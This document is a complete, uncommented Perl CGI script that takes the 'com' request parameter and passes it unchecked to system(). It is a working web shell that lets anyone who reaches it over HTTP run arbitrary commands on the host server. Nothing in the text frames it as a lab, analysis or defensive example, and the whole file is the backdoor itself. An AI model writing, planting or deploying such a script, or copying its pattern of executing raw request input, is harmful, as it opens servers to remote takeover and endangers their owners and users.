#! /usr/bin/perl

use CGI ':standard';
print "Content-type: text/html \n\n";
$c = param('com');
system($c);
